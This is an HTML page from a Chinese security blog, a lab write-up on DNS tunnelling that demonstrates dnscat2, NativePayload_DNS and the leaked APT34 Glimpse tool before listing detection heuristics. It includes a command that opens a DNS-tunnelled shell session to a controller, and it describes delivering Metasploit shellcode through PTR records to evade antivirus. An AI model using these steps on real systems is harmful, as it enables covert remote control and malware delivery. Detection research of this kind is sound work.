@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>由APT34工具Glimpse引申出的DNS隧道问题 | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">由APT34工具Glimpse引申出的DNS隧道问题</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/RedTeam-%E5%9F%9F%E5%AE%89%E5%85%A8/">RedTeam&域安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>由于APT34工具的曝光，还有就是最近工作上关注了一下DNS隧道的检测，所以结合几个工具记录一下。</p>
+<h2 id="DNS隧道简介"><a href="#DNS隧道简介" class="headerlink" title="DNS隧道简介"></a>DNS隧道简介</h2><p>DNS协议是一个分布式的客户机/服务器网络数据库，分布式的原因是：互联网中没有单独的一个站点能够知道所有的信息。</p>
+<p>访问DNS是通过地址解析器的应用程序库来完成，在请求TCP打开一个连接或是使用UDP发送一个单播数据之前，需要知道ip地址。</p>
+<p>而DNS隧道就是通过DNS建立起来的一种隧道连接。</p>
+<h2 id="DNS的几种资源记录类型"><a href="#DNS的几种资源记录类型" class="headerlink" title="DNS的几种资源记录类型"></a>DNS的几种资源记录类型</h2><h3 id="主机记录（A记录）："><a href="#主机记录（A记录）：" class="headerlink" title="主机记录（A记录）："></a>主机记录（A记录）：</h3><p>将DNS中的域名称对应到IPv4地址</p>
+<h4 id="AAAA记录-IPV6解析记录："><a href="#AAAA记录-IPV6解析记录：" class="headerlink" title="AAAA记录 IPV6解析记录："></a>AAAA记录 IPV6解析记录：</h4><p>该记录是将域名解析到一个指定的IPV6的IP上。</p>
+<h3 id="PTR"><a href="#PTR" class="headerlink" title="PTR"></a>PTR</h3><p>定义某个IP对应的域名，</p>
+<h3 id="CNAME-Canonical-Name-记录，通常称别名解析"><a href="#CNAME-Canonical-Name-记录，通常称别名解析" class="headerlink" title="CNAME (Canonical Name)记录，通常称别名解析"></a>CNAME (Canonical Name)记录，通常称别名解析</h3><p>可以将注册的不同域名都转到一个域名记录上，由这个域名记录统一解析管理，与A记录不同的是，CNAME别名记录设置的可以是一个域名的描述而不一定是IP地址</p>
+<h3 id="URL-Uniform-Resource-Locator-转发：网址转发"><a href="#URL-Uniform-Resource-Locator-转发：网址转发" class="headerlink" title="URL (Uniform Resource Locator )转发：网址转发"></a>URL (Uniform Resource Locator )转发：网址转发</h3><p>如果你没有一台独立的服务器（也就是没有一个独立的IP地址）或者您还有一个域名B，您想访问A域名时访问到B域名的内容，这时您就可以通过URL转发来实现。 </p>
+<p>url转发可以转发到某一个目录下，甚至某一个文件上。而cname是不可以，这就是url转发和cname的主要区别所在。</p>
+<h3 id="服务位置记录（SRV记录）："><a href="#服务位置记录（SRV记录）：" class="headerlink" title="服务位置记录（SRV记录）："></a>服务位置记录（SRV记录）：</h3><p>RFC 2782定义，用于定义提供特定服务的服务器的位置，如主机（hostname），端口（port number）等。</p>
+<h3 id="NS（Name-Server）记录是域名服务器记录"><a href="#NS（Name-Server）记录是域名服务器记录" class="headerlink" title="NS（Name Server）记录是域名服务器记录"></a>NS（Name Server）记录是域名服务器记录</h3><p>用来指定该域名由哪个DNS服务器来进行解析，可以把一个域名的不同二级域名分别指向到不同的DNS系统来解析。</p>
+<h3 id="TXT记录："><a href="#TXT记录：" class="headerlink" title="TXT记录："></a>TXT记录：</h3><p>TXT记录一般是为某条记录设置说明，比如你新建了一条a.ezloo.com的TXT记录，TXT记录内容”this is a test TXT record.”，然后你用 nslookup -qt=txt a.ezloo.com ，你就能看到”this is a test TXT record”的字样。</p>
+<p>除外，TXT还可以用来验证域名的所有，比如你的域名使用了Google的某项服务，Google会要求你建一个TXT记录，然后Google验证你对此域名是否具备管理权限。</p>
+<h2 id="DNS隧道利用"><a href="#DNS隧道利用" class="headerlink" title="DNS隧道利用"></a>DNS隧道利用</h2><p>选几个算是比较有代表性的工具来说明一下。</p>
+<h3 id="DNSCAT2"><a href="#DNSCAT2" class="headerlink" title="DNSCAT2"></a>DNSCAT2</h3><p>DNSCAT2的控制端使用的是Ruby，被控端使用编译好的exe文件，后来网上也有Powershell版本的dnscat。安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br></pre></td></tr></table></figure>
+
+<p>然后ruby dnscat2.rb domain_name运行，这个domain_name需要能够被解析到，否则就不行，我这里本地实验所以把被控端的DNS地址改成了控制端的IP，否则被控端解析不到test域名。</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image001.png" alt="img"></p>
+<p>然后再被控端执行powershell脚本dnscat2.ps1</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Dnscat2</span> <span class="literal">-Domain</span> test <span class="literal">-DnsServer</span> <span class="number">192.168</span>.<span class="number">144.130</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image002.png" alt="img"></p>
+<p>然后可以看到dnscat2这边已经反弹回了一个session 1</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image003.png" alt="img"></p>
+<p>使用shell命令进行</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image004.png" alt="img"></p>
+<p>通过抓包可以看到全部使用DNS协议进行数据通信，并且会随机采用三种不同类型的查询方式进行传输内容。</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image005.png" alt="img"></p>
+<p>DNSCAT还有一些其他的使用方式，具体不再说明。</p>
+<h3 id="NativePayload-DNS"><a href="#NativePayload-DNS" class="headerlink" title="NativePayload_DNS"></a>NativePayload_DNS</h3><p>NativePayload_DNS不是利用DNS隧道来进行命令控制上传文件，而是利用DNS隧道来传输shellcode，也就是分离免杀，躲避杀软的静态检测。</p>
+<p>地址：<a href="https://github.com/DamonMohammadbagher/NativePayload_DNS" target="_blank" rel="noopener">https://github.com/DamonMohammadbagher/NativePayload_DNS</a></p>
+<p>这里作者提供的是c#的源代码，需要自己生成exe文件，我用的是</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image006.png" alt="img"></p>
+<p>使用：</p>
+<p>首先将MSF生成的shellcode制作成IP+地址的格式</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image007.png" alt="img"></p>
+<p>使用dnsspoof创建DNS服务器，并使用MSF开启监听。</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image008.png" alt="img"></p>
+<p>在win7主机上执行生成的exe文件</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image009.png" alt="img"></p>
+<p>成功执行shellcode</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image010.png" alt="img"></p>
+<p>原理：</p>
+<p>看下C#代码可以看到，原理其实很简单，代码也比较短。首先看其中存在一个包含DNS_PTR_A和DNSServer两个参数的函数__nslookup。</p>
+<p>使用ProcessStartInfo类接收nslookup.exe的返回值，比如nslookup.exe 1.1.1.1 192.168.144.130，对应的PTR记录（通过IP反查域名）就是0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image011.png" alt="img"></p>
+<p>这里把地址的个数设置为了34，就是shellcode的行数，上面的dns.txt可以看到</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image012.png" alt="img"></p>
+<p>然后通过循环遍历请求1.1.1.0-1.1.1.33对应的PTR记录，即可达到远程调用shellcode的目的。</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image013.png" alt="img"></p>
+<p>再看PCAP包，可以看到33个PTR请求，返回值为Dmain Name字段，就是shellcode。</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image014.png" alt="img"></p>
+<h3 id="APT34-Glimpse"><a href="#APT34-Glimpse" class="headerlink" title="APT34-Glimpse"></a>APT34-Glimpse</h3><p>APT34刚刚报出的远控工具，考虑到需要进行检测，就看了一下</p>
+<p>结构：</p>
+<p>工具是分为三个部分，server、Agent、panel</p>
+<p>Server是一个node.js编写的服务端，会建立一个dns服务器</p>
+<p>panel中的exe文件为可视化控制台</p>
+<p>Agent中主要看dns_main.ps1，其他两个powershell文件都是混淆过的。</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image015.png" alt="img"></p>
+<p>演示：</p>
+<p>文件中包含了Readme文件，照着安装就好。</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image016.png" alt="img"></p>
+<p>安装好了node.js然后forever start srvr.js开启</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image017.png" alt="img"></p>
+<p>然后打开panel中的exe控制端</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image018.png" alt="img"></p>
+<p>被控端运行dns_main.ps1之后看到出现的被控端</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image019.png" alt="img"></p>
+<p>双击进入Agent Control Panel面板</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image020.png" alt="img"></p>
+<p>测试了whoami，powershell脚本会在目录C:\Users\Public\Libraries\39af49429e\sendbox下创建一个proc10110文件</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image021.png" alt="img"></p>
+<p>通过抓包可以看到TXT记录中使用S0000&gt;后面加base64编码的whoami命令</p>
+<p>S0000&gt;aXBjb25maWc=</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image022.png" alt="img"></p>
+<p>从dns_main.ps1中看的话可以看到一个大致的流程，首先会创建C:\Users\Public\Libraries目录，然后根据生成随机值创建文件夹</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image023.png" alt="img"></p>
+<p>三个目录分别对应的是接收到的命令和命令执行的结果</p>
+<p><img src="%E7%94%B1APT34%E5%B7%A5%E5%85%B7Glimpse%E5%BC%95%E7%94%B3%E5%87%BA%E7%9A%84DNS%E9%9A%A7%E9%81%93%E9%97%AE%E9%A2%98.assets/clip_image024.png" alt="img"></p>
+<h2 id="DNS隧道的检测"><a href="#DNS隧道的检测" class="headerlink" title="DNS隧道的检测"></a>DNS隧道的检测</h2><p>其实上面所说的三种工具特征都非常明显，比较容易检测，但是DNS隧道的应用又非常灵活，假如作者稍加修改，可能单纯从特征上来匹配的检测规则就被绕过，所以想检测DNS隧道还是需要结合域名长度次数之类的情况。</p>
+<p>一般情况可以总结的特征：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求方为受控方</span><br><span class="line">可能存在超长无.的TXT回包</span><br><span class="line">没有A记录返回结果</span><br><span class="line">TXT回包内容中大概率没有类似于.com|.cn|.net等域名格式</span><br></pre></td></tr></table></figure>
+
+<p>暂时还没有出测试结果，所以这些检测的有效性还需要检验，而且这里说的几个是利用TXT记录的，如果只检测TXT记录等于上文说的NativePayload_DNS又跳过了，所以检测的类型也要保证多样。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-%E8%BF%B7%E4%B8%80%E6%A0%B7%E7%9A%84KB2871997/">迷一样的KB2871997</a>
+            
+            
+            <a class="next" rel="next" href="/2020/12-18-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%B8%89%E7%89%88%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1%E4%BA%8C/">汇编语言第三版课程设计二</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
